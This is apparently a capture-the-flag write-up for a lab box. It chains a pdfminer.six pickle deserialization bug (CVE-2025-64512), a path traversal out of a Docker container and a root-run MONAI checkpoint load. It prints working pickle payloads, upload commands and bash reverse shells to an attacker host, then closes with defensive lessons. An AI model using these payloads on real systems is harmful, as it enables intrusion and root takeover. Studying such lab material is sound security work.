Bedside

Medium Linux ✓ Pwned
Date 2026-07-19
OS Linux — Debian GNU/Linux 13 (trixie), reached first through a Docker container
Stack pdfminer.six (PDF/CMap parsing)  ·  Vite dev server (React)  ·  Docker  ·  PyTorch 2.5 + MONAI 1.5 training pipeline
CVE CVE-2025-64512 (pdfminer.six CMap pickle deserialization RCE)

Summary

Bedside is a medical-imaging themed box where the same underlying bug — trusting a "data format" that is secretly a pickle — shows up twice, at opposite ends of the chain:

  1. Initial access — a research subdomain fingerprinted via X-Powered-By: pdfminer.six is vulnerable to CVE-2025-64512: pdfminer resolves a font's CMap resource by filesystem path and unpickles whatever is there. Guessing the upload directory and uploading a real PDF alongside a malicious pickle gives RCE as datawrangler inside a Docker container.
  2. Docker → host pivot — the container shares a host bind-mount and can reach an internal-only Vite dev server on 127.0.0.1:3000 (firewalled from outside). Its static file handler is vulnerable to URL-encoded path traversal, which is used to read developer's SSH private key directly off the host disk.
  3. Privilege escalation — developer can run a MONAI/PyTorch training script as root via sudo. The script loads whichever checkpoint has the newest mtime through MONAI's CheckpointLoader, which hardcodes torch.load(..., weights_only=False). The checkpoint directory is writable by datawrangler (the container account from step 1), so a pickle payload planted there executes as root the next time the script runs — the same bug class as the foothold, closing the loop.

Port 3000 being filtered rather than closed is the first hint that something is listening there but firewalled from the external interface — worth remembering once there's a foothold. Port 80 is a static "Bedside Clinic" marketing page with nothing interesting on it, so the next step is virtual-host enumeration:

Out of 5000 guesses, exactly one returns a real 200 instead of the wildcard redirect. Adding it to /etc/hosts reveals a "Bedside Research Portal" — a file upload form for staff to submit medical imaging (PDF, images, archives). One response header gives away the processing stack immediately:

HTTP/1.1 200 OK
X-Powered-By: pdfminer.six

Initial Access — CVE-2025-64512

CVE-2025-64512 is a deserialization bug in pdfminer.six's font/CMap resolution. When a PDF font's /Encoding references a CMap by name, pdfminer looks it up on disk — and if that lookup resolves outside the bundled CMap set, the library reads the target bytes and calls pickle.loads() on them with no check that the result is actually a CMap object. A crafted object with a __reduce__ method runs as soon as it's reconstructed.

Exploiting it needs the exact filesystem path the upload form writes to. Rather than guess once, the fastest approach was firing a batch of candidate-path payloads (13 guesses at common /var/www/*/uploads-style locations) and letting the server's own validation errors leak the truth:

curl -s -F "uploadFile=@trigger.pdf;type=application/pdf" http://research.bedside.htb/

MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads

With the real path confirmed, the exploit is two files uploaded in order — a resource pickle first, then a PDF that references it:

# payload.pickle.gz — malicious CMap resource
class RCE:
    def __init__(self, cmd): self.cmd = cmd
    def __reduce__(self): return (os.system, (self.cmd,))

revshell = f"/bin/bash -c 'bash -i >&/dev/tcp/{LHOST}/{LPORT} 0>&1'"
cmd = f"echo {base64.b64encode(revshell.encode()).decode()} | base64 -d | bash"
gzip.compress(pickle.dumps(RCE(cmd)))  -> payload.pickle.gz

# trigger.pdf — legitimate PDF whose font Encoding points at the resource
/Encoding /%2Fvar%2Fwww%2Fresearch.bedside.htb%2Fuploads%2Fpayload
curl -s -F "uploadFile=@payload.pickle.gz;type=application/gzip" http://research.bedside.htb/
curl -s -F "uploadFile=@trigger.pdf;type=application/pdf"        http://research.bedside.htb/

An async worker (later found as /app/pdf_watcher.py inside the container) polls the uploads directory every 30 seconds and runs pdf2txt.py against any new PDF for text extraction — which is what actually invokes pdfminer and triggers the deserialization.

Docker Escape — Path Traversal to a Host SSH Key

/.dockerenv confirms the shell is inside a container. mount shows a bind-mounted /datastore backed by the host's /dev/sda4 — shared storage that turns out to matter a lot later for privesc. More immediately useful: /proc/net/tcp shows something bound to 127.0.0.1:3000, reachable from inside the container even though nmap saw it as filtered externally, because the container shares the host's network namespace.

Privilege Escalation — torch.load() via Sudo

developer@bedside:~$ sudo -l

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py

A quick gotcha worth flagging: sudoers command matching with a fixed argument list is exact. Running the script with any extra flags — e.g. --epochs 1 --batch-size 1 — does not match the whitelisted command and falls straight through to interactive password auth, which looks like the rule "isn't working." It has to be invoked bare to hit the NOPASSWD entry.

Reading /opt/trainer/bedside_trainer.py (root-owned, world-readable) shows a MONAI/PyTorch training loop over /datastore: it promotes files from staging/ to processed/, builds a tiny model from whatever image data it finds, then — before any actual training happens — loads the most recently modified checkpoint:

latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)   # sorted by os.path.getmtime
if latest_ckpt:
    loader = CheckpointLoader(
        load_path=str(latest_ckpt),
        load_dict={"model": model, "optimizer": optimizer},
        map_location=DEVICE,
    )
    loader(engine)   # invokes torch.load() on our file, as root

MONAI's CheckpointLoader hardcodes the unsafe deserialization path regardless of PyTorch version:

# /usr/local/lib/python3.13/dist-packages/monai/handlers/checkpoint_loader.py:125
checkpoint = torch.load(self.load_path, map_location=self.map_location, weights_only=False)

Confirmed on target: torch 2.5.0+cpu (the weights_only=True default only landed in torch 2.6) and monai 1.5.0 — so even a newer torch wouldn't help here, since MONAI overrides the default explicitly. Any .pt file is just a pickle stream with extra steps.

developer has zero access to /datastore itself (owned datawrangler:dataops, mode 770) — every path under it returns Permission denied. The plant has to happen from the still-open datawrangler container shell instead, which is in the dataops group:

# from the datawrangler container:
# 1) a real, decodable image in processed/ — without one, the script exits
#    early at "No data available to train" and never reaches the checkpoint load
open('/datastore/processed/seed.png', 'wb').write()

# 2) a malicious checkpoint — picked up as "latest" by mtime
class RCE:
    def __reduce__(self):
        return (os.system, (cmd,))   # cmd = base64-wrapped reverse shell to 10.10.16.199:5555

pickle.dump(RCE(), open('/datastore/checkpoints/checkpoint_epoch_9999.pt', 'wb'), protocol=2)

With both files staged and a listener up on 5555, the trigger from the developer SSH session is the bare sudo command — no flags, to match the NOPASSWD rule exactly:

developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py

CheckpointLoader picks up checkpoint_epoch_9999.pt as the newest file by mtime, torch.load() deserializes the planted RCE.__reduce__, and os.system() fires the reverse shell — as root, before a single training epoch runs.

Defensive Takeaways

  • Don't echo absolute server-side paths in validation errors. The "MIME type mismatch" message handed over the exact upload directory, turning a 13-path guessing exercise into a one-shot exploit.
  • Pickle-based formats are code execution regardless of the file extension. A .pt checkpoint and a .pickle.gz CMap resource are the same underlying bug: anything built on Python's pickle protocol — torch.save/load, joblib, custom resource caches — executes attacker-chosen callables the moment it's deserialized. Extension and "it's just weights" framing don't change that.
  • Library wrappers can silently defeat upstream safety defaults. PyTorch made weights_only=True the default in 2.6 specifically to close this class of bug, but MONAI's CheckpointLoader passes weights_only=False explicitly, overriding it. A safe default one layer down is worthless if a wrapper two layers up unsets it.
  • A shared bind-mount plus a root-run consumer collapses the trust boundary between accounts. datawrangler and developer look unrelated, but because developer's sudo rule deserializes whatever datawrangler can write to /datastore/checkpoints, they're functionally the same trust level. Least-privilege the writers of anything a privileged process later loads.
  • A dev server is not a hardened static file host. Vite's dev server was reachable only via the container's shared network namespace, but "internal-only" isn't isolation once any code execution exists on that namespace — see my localhost-not-a-boundary notes.
